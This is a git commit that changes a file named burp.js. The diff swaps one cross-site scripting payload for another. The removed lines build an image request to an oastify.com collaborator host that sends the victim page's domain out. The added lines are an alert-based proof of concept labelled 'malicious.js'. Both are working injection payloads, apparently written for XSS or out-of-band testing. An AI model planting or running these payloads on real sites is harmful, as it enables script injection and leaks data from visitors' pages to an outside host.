ee59f0ec3302c362eb4a7d8b73cc75cc2068d463
D4rkm4g1c <TheD4rkm4g1c@proton.me>
2025-01-21 09:58:58 +0000

    Update burp.js

--- burp.js
+++ burp.js
@@ -1,2 +1,2 @@
-var img = new Image();
-img.src = 'http://uigx2nemphinqanol058x07qnht8h3fr4.oastify.com/test?domain=' + encodeURIComponent(document.domain);
+// malicious.js - simple pop-up
+alert('DOM-based XSS Triggered!');
